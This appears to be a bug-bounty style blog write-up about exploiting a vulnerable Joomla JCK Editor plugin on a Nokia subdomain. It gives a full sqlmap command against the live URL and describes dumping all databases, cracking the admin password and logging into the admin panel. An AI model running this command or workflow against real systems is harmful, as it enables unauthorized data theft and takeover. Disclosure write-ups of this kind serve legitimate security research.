---
layout: post
title: "SQL inection on gdclive.nokia.com"
date: 2021-5-2
comments: true
---



Hi , this blog about SQL Injection in Nokia.com Allowed me to Dump all database

### Full POC :

when im visiting this domain gdclive.nokia.com i've found something

First : this domain has been used an old version of Joomla CMS

let's scan it using joomscan tool for dumping all informations about joomla (plugins , version ,etc..)

All results :
```
Joomla Version : 3.1
Plugins : JCK Editor (6.4.4)
```
searching for JCK Editor in exploit-db.com
and i've found this exploit https://www.exploit-db.com/exploits/45423
let's exploit it :D

<img src='https://1.bp.blogspot.com/-LgYxMfeJKhs/Xscwx2tKONI/AAAAAAAAEMs/HJ5I5jgXFv8ExESVK3bm0Mk2hpQWbDiagCK4BGAsYHg/nokiasql.png'>

Worked ..!
you can see the version of database :D

this is the time of SQLMAP Tool

<img src='https://1.bp.blogspot.com/-ab46BpK-smI/XscxAQOmJ7I/AAAAAAAAEM4/SmsR9X4vGKUDxJttE5KqF6nwhdH_nPgIwCK4BGAsYHg/sqlmap-sqlmap-everywhere.jpg'>

```bash
$ sqlmap -u 'https://gdclive.nokia.com/plugins/editors/jckeditor/plugins/jtreelink/dialogs/links.php?extension=menu&view=menu&parent=' --level=5 --risk=3 --random-agent --technique=U -p parent --batch --current-db --current-user
```
<img src='https://1.bp.blogspot.com/-IbBm5REMsIk/XscwNZ7ixwI/AAAAAAAAEMM/0ggiZ2zzOnstGv_qYIm6NOJG1FOzIcRtQCK4BGAsYHg/sql1.png'>

you can see the current user and the name of database :)
After dumping all databases using `--all` option and unencrypt the password of admin account let's login in admin panel

<img src='https://1.bp.blogspot.com/-87ctqF3EmDM/XscxFpvVAhI/AAAAAAAAENE/Cgi-Kfnjxco0cND_FONrVmsOWySdiu_SQCK4BGAsYHg/cp.jpg'>
PWNED :D

You can see this <a href='https://drive.google.com/file/d/1bajARVMgUHBcN7FPCtRA_Bc7-SX656x4/view?usp=sharing'>video</a> about this bug

<img src='https://1.bp.blogspot.com/-JdAGAWLC5yA/XscxTfP79KI/AAAAAAAAENc/rQY_TFPpBuMSjb5fhP36B9O6nrndFtSjgCK4BGAsYHg/nokia_rep.png'>

Thanks ;0
